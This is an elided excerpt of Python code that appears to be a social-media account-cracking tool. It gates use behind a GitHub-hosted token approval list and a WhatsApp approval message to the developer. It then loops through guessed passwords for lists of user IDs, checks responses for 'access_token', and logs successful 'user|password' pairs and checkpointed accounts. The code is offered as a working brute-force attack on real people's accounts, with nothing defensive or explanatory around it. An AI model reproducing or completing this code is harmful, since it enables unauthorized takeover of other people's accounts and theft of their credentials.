...
def reg():
    ...
    try:
        ...
        reg2()
    r = requests.get('https://raw.githubusercontent.com/X-tiger-X/X-NOT-TIGER-X/main/list.txt').text
    if to in r:
        time.sleep(2)
        bsn_menu()
    else:
...
def reg2():
    ...
    os.system('xdg-open https://wa.me/+923491383368?text=Assalamualaikum Sir Approve my Token and my Token :'+id)
...
class __bsn__:
    ...
    def __api__(self, user, __chi__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write(f'\r [Mala] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
            sys.stdout.flush()
        for pw in __chi__:
            pw = pw.lower()
            ...
            if "access_token" in p:
                ...
                try:
                    ...
                    print('\r%s \033[1;91m[CP-Mala] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
